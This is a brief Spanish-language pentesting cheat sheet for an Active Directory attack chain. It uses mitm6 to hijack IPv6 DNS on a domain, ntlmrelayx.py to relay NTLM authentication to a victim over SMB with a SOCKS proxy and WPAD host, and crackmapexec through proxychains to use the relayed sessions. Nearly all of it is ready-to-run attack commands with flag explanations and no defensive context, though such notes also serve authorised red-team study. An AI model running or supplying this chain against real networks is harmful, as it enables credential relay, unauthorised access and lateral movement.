
```ruby
mitm6 -d {nombre del dominio}
```

- -d: Indica el dominio 

```python
ntlmrelayx.py -6 -wh {nuestra ip} -t smb://{maquinavictima} -socks -debug -smb2support
```

- -6: indica que se use IPv6
- -wh: Define el WPAD_HOST (Nosotros)
- -t: define el Objetivo
- -socks: Lanza un servido SOCKS para redirigir el trafico
- -debug: muestra mas información
- -smb2support: permite el uso de SMBv2

```python
proxychains crackmapexec smb {maquinavictima} -u '{usuario}' -p '{loquesea}' -d 'dominio'
```